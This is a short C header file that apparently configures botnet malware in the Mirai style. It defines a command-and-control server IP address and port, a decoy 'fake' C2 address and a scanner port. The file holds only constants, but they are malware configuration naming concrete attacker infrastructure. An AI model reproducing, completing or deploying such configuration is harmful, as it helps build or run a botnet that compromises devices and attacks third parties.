#pragma once


#define CNC_IP "151.243.109.99"
#define CNC_PORT 1939

#define FAKE_CNC_ADDR INET_ADDR(176,123,26,89)
#define FAKE_CNC_PORT 1939

#define SCANNER_PORT 24529
